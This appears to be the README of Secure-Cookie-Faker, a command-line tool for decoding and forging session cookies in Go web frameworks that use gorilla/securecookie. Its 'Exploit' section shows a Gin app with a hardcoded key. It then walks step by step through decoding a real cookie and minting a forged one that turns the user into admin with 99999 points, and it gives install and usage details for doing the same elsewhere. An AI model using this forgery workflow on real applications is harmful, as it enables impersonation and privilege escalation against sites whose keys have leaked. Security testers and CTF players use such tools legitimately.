# Secure-Cookie-Faker

security tool to encode/decode Golang web-frameworks' client-side session cookie which use [gorilla/securecookie](https://github.com/gorilla/securecookie) or [gorilla/sessions](https://github.com/gorilla/sessions), such as Gin, Echo or Iris

***

## Stats

top stars Go web-frameworks' using of [gorilla/securecookie](https://github.com/gorilla/securecookie) or [gorilla/sessions](https://github.com/gorilla/sessions)

(stars count comes from [go-web-framework-stars](https://github.com/mingrammer/go-web-framework-stars))

| web framework                                    | stars | uses gorilla's securecookie or sessions? |
| ------------------------------------------------ | ----- | ---------------------------------------- |
| [gin](https://github.com/gin-gonic/gin)          | 28126 | ✔                                        |
| [beego](https://github.com/astaxie/beego)        | 20805 | ✘                                        |
| [iris](https://github.com/kataras/iris)          | 15102 | ✔                                        |
| [echo](https://github.com/labstack/echo)         | 14180 | ✔                                        |
| [kit](https://github.com/go-kit/kit)             | 13920 | ✘                                        |
| [revel](https://github.com/revel/revel)          | 11125 | ✘                                        |
| [martini](https://github.com/go-martini/martini) | 10572 | ✔                                        |

and many personal application using them as a basic web application toolkit [link](https://github.com/search?q=import+%22github.com%2Fgorilla%2Fsessions%22&type=Code)

***

## Exploit

secret-key ensures the safety of the client-side cookie, if secret-key was gotten by **source code leaked**, **LFI**, or ...etc., hacking that web application becomes so easy

take the Gin web-framework as an example

**source code:**

```go
package main

import (
    "github.com/gin-gonic/gin"
    "github.com/gin-contrib/sessions"
    "github.com/gin-contrib/sessions/cookie"
)

func main() {
    r := gin.Default()

    store := cookie.NewStore([]byte("xxxxxxxxxxxx"))
    r.Use(sessions.Sessions("session", store))

    r.GET("/", func(c *gin.Context) {
        session := sessions.Default(c)
        session.Set("user", "test")
        session.Set("id", 100)
        session.Set("point", 0)
        session.Save()
    })

    r.GET("/show", func(c *gin.Context) {
        session := sessions.Default(c)
        user := session.Get("user")
        id := session.Get("id")
        point := session.Get("point")
        c.JSON(200, gin.H{
            "user": user,
            "id": id,
            "point": point,
        })
    })

    r.Run(":5000")
}
```

request to `/`，get cookie: 

`Set-Cookie: session=MTU2MTE4NjIzNnxEdi1CQkFFQ180SUFBUkFCRUFBQVVQLUNBQU1HYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBWUFCSFJsYzNRR2MzUnlhVzVuREFRQUFtbGtBMmx1ZEFRREFQX0lCbk4wY21sdVp3d0hBQVZ3YjJsdWRBTnBiblFFQWdBQXxlwq6mxtwXuKDMeXOyDaHpR-Hcn0veF2OmBqc4F76puQ==`

decode it

```
λ .\faker.exe dec -n session -k xxxxxxxxxxxx -c "MTU2MTE4NjIzNnxEdi1CQkFFQ180SUFBUkFC RUFBQVVQLUNBQU1HYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBWUFCSFJsYzNRR2MzUnlhVzVuREFRQUFtbGtBMmx1ZEFRREFQX0lCbk4wY21sdVp3d0hBQVZ3YjJsdWRBTnBiblFFQWdBQXxlwq6mxtwXuKDMeXOyDaHpR-Hcn0veF2OmBqc4F76puQ=="
map[id:100 point:0 user:test]
type detail:
{
    user[string]: test[string],
    id[string]: 100[int],
    point[string]: 0[int],
}
```

fake identity

```
λ .\faker.exe enc -n session -k xxxxxxxxxxxx -o "{user:admin, id:0[int], point:99999[ int]}"
MTU2MTE4NjQzNHxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUJUXzRJQUF3WnpkSEpwYm1jTUJnQUVkWE5sY2daemRISnBibWNNQndBRllXUnRhVzRHYzNSeWFXNW5EQVFBQW1sa0EybHVkQVFDQUFBR2MzUnlhVzVuREFjQUJYQnZhVzUwQTJsdWRBUUZBUDBERFQ0PXwKR14WwPjXeUBZlZ0sKcEfRu-n7_va9drjsFaIEVahmA==
```

modify cookie, then request to `/show`，we are admin now

***

## Installation

```
go get github.com/eddieivan01/secure-cookie-faker
go install -ldflags="-s -w"
```

or 

```
git clone https://github.com/eddieivan01/secure-cookie-faker.git
cd secure-cookie-faker
go build -ldflags="-s -w" -o faker
```

or

download binary file from [releases page](https://github.com/eddieivan01/secure-cookie-faker/releases)

***

## Usage

```
Secure Cookie Faker v0.1

Usage: faker [enc/dec] [-n cookie_name] [-k secret_key] [-o object_string / -c cookie_string]

Mode: 
  dec
        decode mode, cookie => object
  enc
        encode mode, object => cookie

Options:
  --help    show help
  -k string
        secret keys, string like "key" or "key1, key2, key3"
  -n string
        cookie name
  -o string
        object to be encoded, string like "{key1[type]: value1[type], key2[type]: value2[type]}"
        type could be `int`, `float`, `bool`, `string`, `byte`
        when type is `string`, it could be omitted. like this {str1: str2}
        if mode is encode, this param is required
  -c string
        cookie to be decoded
        if mode is decode, this param is required
```

## Example

choosing a mode is required: enc or dec
```
./faker dec -n "mysession" -k "secret_key" -c "MTU2MTE4NjQzNHxFXy1CQkFFQkEwOWlhZ0hfZ2dBQkVBRVFBQUJUXzRJQUF3WnpkSEpwYm1jTUJnQUVkWE5sY2daemRISnBibWNNQndBRllXUnRhVzRHYzNSeWFXNW5EQVFBQW1sa0EybHVkQVFDQUFBR2MzUnlhVzVuREFjQUJYQnZhVzUwQTJsdWRBUUZBUDBERFQ0PXwKR14WwPjXeUBZlZ0sKcEfRu-n7_va9drjsFaIEVahmA=="
```

`-n` means the cookie name, its required because the cookie generation relies on it

`-k` means the secret key(s), could be multiple: `-k "key1, key2, key3"`

`-c` means the cookie to be decoded

***

when encode a object

```
./faker enc -n "mysession" -k "secret" -o "{user: admin, id: 0[int]}"
```

`-o `means the object string，its like a K-V map. 

when the element is `string` type, the type tag can be omitted

the type tag can only be `int`,  `uint`,  `float`,  `bool`,  `string`,  `byte`

***

## Feature

* CLI tool to fake session-cookie
* parse the type hint when decoding / choose the type when encoding

***

## TODO

- [ ] support slice type